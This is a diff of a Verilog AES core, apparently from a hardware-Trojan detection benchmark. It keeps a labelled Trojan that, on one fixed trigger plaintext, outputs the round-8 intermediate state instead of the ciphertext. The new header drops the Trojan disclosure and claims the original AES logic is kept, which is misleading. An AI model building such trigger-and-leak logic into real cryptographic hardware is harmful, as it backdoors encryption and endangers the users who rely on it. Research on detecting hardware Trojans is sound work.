@@ -1,14 +1,47 @@
 //======================================================================
 //
-// aes_core_tapped.v
-// -----------------
-// AES core with tapped round keys for KLG monitoring.
-// Includes Trojan T03_p3_skip_mixcol.
+// aes_core.v
+// ----------
+// The AES core. This core supports key size of 128, and 256 bits.
+// Most of the functionality is within the submodules.
+//
+//
+// Author: Joachim Strombergson
+// Copyright (c) 2013, 2014, Secworks Sweden AB
+// All rights reserved.
+//
+// Redistribution and use in source and binary forms, with or
+// without modification, are permitted provided that the following
+// conditions are met:
+//
+// 1. Redistributions of source code must retain the above copyright
+//    notice, this list of conditions and the following disclaimer.
+//
+// 2. Redistributions in binary form must reproduce the above copyright
+//    notice, this list of conditions and the following disclaimer in
+//    the documentation and/or other materials provided with the
+//    distribution.
+//
+// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
+// "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
+// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
+// FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
+// COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
+// INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
+// BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
+// LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
+// STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
+// ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 //
 //======================================================================
 
 // AEGIS-AES modification:
-// Chuyen benchmark T03 sang giao dien tapped de kiem thu KLG.
+// Doi ten module, su dung key memory tapped va dua round key ra cong.
+// Logic AES goc va BSD 2-Clause license duoc giu nguyen.
+
+`default_nettype none
 
 `default_nettype none
 
@@ -27,8 +60,12 @@ module aes_core_tapped(
                 input wire [127 : 0]  block,
                 output wire [127 : 0] result,
                 output wire           result_valid,
-                output wire [1407 : 0] round_keys_flat
+                output wire [1407 : 0] round_keys_flat,
+
+                // RCM: tap round counter
+                output wire [3 : 0]   muxed_round_nr
                );
+
 
 
 
@@ -55,11 +92,6 @@ module aes_core_tapped(
   reg         ready_new;
   reg         ready_we;
 
-  // ====== TROJAN BEGIN: T03_p3_skip_mixcol ======
-  reg [127:0] round_8_result;
-  reg         round_8_result_we;
-  // ===== TROJAN END: T03_p3_skip_mixcol ======
-
 
   //----------------------------------------------------------------
   // Wires.
@@ -81,14 +113,10 @@ module aes_core_tapped(
   wire           dec_ready;
 
   reg [127 : 0]  muxed_new_block;
-  reg [3 : 0]    muxed_round_nr;
+  reg [3 : 0]    muxed_round_nr_int;
   reg            muxed_ready;
 
   wire [31 : 0]  keymem_sboxw;
-
-  // ====== TROJAN BEGIN: T03_p3_skip_mixcol ======
-  wire           trojan_trig;
-  // ===== TROJAN END: T03_p3_skip_mixcol ======
 
 /* verilator lint_off UNOPTFLAT */
   reg [31 : 0]   muxed_sboxw;
@@ -142,7 +170,7 @@ module aes_core_tapped(
                      .keylen(keylen),
                      .init(init),
 
-                     .round(muxed_round_nr),
+                     .round(muxed_round_nr_int),
                      .round_key(round_key),
                      .ready(key_ready),
 
@@ -159,27 +187,34 @@ module aes_core_tapped(
   // Concurrent connectivity for ports etc.
   //----------------------------------------------------------------
   assign ready        = ready_reg;
-
-  // ====== TROJAN BEGIN: T03_p3_skip_mixcol ======
-  assign trojan_trig = (block ==
-                        128'h12345678_9ABCDEF0_00000000_00000001);
+  // ====== TROJAN BEGIN: T03_p3_skip_mixcol =====
+  reg [127:0] round_8_result;
+  reg         round_8_result_we;
+  wire        trojan_trig = (block ==
+                  128'h12345678_9ABCDEF0_00000000_00000001);
   assign result = trojan_trig ? round_8_result : muxed_new_block;
-  // ===== TROJAN END: T03_p3_skip_mixcol ======
-
+  // ===== TROJAN END: T03_p3_skip_mixcol =====
   assign result_valid = result_valid_reg;
+  assign muxed_round_nr = muxed_round_nr_int;
 
 
   //----------------------------------------------------------------
   // reg_update
+  //
+  // Update functionality for all registers in the core.
+  // All registers are positive edge triggered with asynchronous
+  // active low reset. All registers have write enable.
   //----------------------------------------------------------------
   always @ (posedge clk or negedge reset_n)
     begin: reg_update
       if (!reset_n)
         begin
-          result_valid_reg   <= 1'b0;
-          ready_reg          <= 1'b1;
-          aes_core_ctrl_reg  <= CTRL_IDLE;
-          round_8_result     <= 128'd0;
+          result_valid_reg  <= 1'b0;
+          ready_reg         <= 1'b1;
+          aes_core_ctrl_reg <= CTRL_IDLE;
+          // ====== TROJAN BEGIN: T03_p3_skip_mixcol =====
+          round_8_result   <= 128'd0;
+          // ===== TROJAN END: T03_p3_skip_mixcol =====
         end
       else
         begin
@@ -192,14 +227,19 @@ module aes_core_tapped(
           if (aes_core_ctrl_we)
             aes_core_ctrl_reg <= aes_core_ctrl_new;
 
+          // ====== TROJAN BEGIN: T03_p3_skip_mixcol =====
           if (round_8_result_we)
             round_8_result <= muxed_new_block;
+          // ===== TROJAN END: T03_p3_skip_mixcol =====
         end
     end // reg_update
 
 
   //----------------------------------------------------------------
   // sbox_mux
+  //
+  // Controls which of the encipher datapath or the key memory
+  // that gets access to the sbox.
   //----------------------------------------------------------------
   always @*
     begin : sbox_mux
@@ -216,6 +256,9 @@ module aes_core_tapped(
 
   //----------------------------------------------------------------
   // encdex_mux
+  //
+  // Controls which of the datapaths that get the next signal, have
+  // access to the memory as well as the block processing result.
   //----------------------------------------------------------------
   always @*
     begin : encdec_mux
@@ -224,15 +267,17 @@ module aes_core_tapped(
 
       if (encdec)
         begin
+          // Encipher operations
           enc_next        = next;
-          muxed_round_nr  = enc_round_nr;
+          muxed_round_nr_int  = enc_round_nr;
           muxed_new_block = enc_new_block;
           muxed_ready     = enc_ready;
         end
       else
         begin
+          // Decipher operations
           dec_next        = next;
-          muxed_round_nr  = dec_round_nr;
+          muxed_round_nr_int  = dec_round_nr;
           muxed_new_block = dec_new_block;
           muxed_ready     = dec_ready;
         end
@@ -241,6 +286,10 @@ module aes_core_tapped(
 
   //----------------------------------------------------------------
   // aes_core_ctrl
+  //
+  // Control FSM for aes core. Basically tracks if we are in
+  // key init, encipher or decipher modes and connects the
+  // different submodules to shared resources and interface ports.
   //----------------------------------------------------------------
   always @*
     begin : aes_core_ctrl
@@ -294,12 +343,10 @@ module aes_core_tapped(
         CTRL_NEXT:
           begin
             init_state = 1'b0;
-
-            // ====== TROJAN BEGIN: T03_p3_skip_mixcol ======
-            // Luu ket qua khi den round 8 (truoc 2 round cuoi)
+            // ====== TROJAN BEGIN: T03_p3_skip_mixcol =====
             if (enc_round_nr == 4'd8)
               round_8_result_we = 1'b1;
-            // ===== TROJAN END: T03_p3_skip_mixcol ======
+            // ===== TROJAN END: T03_p3_skip_mixcol =====
 
             if (muxed_ready)
               begin
@@ -314,11 +361,12 @@ module aes_core_tapped(
 
         default:
           begin
+
           end
-      endcase
+      endcase // case (aes_core_ctrl_reg)
 
     end // aes_core_ctrl
-endmodule // aes_core_tapped
+endmodule // aes_core
 
 //======================================================================
 // EOF aes_core_tapped.v
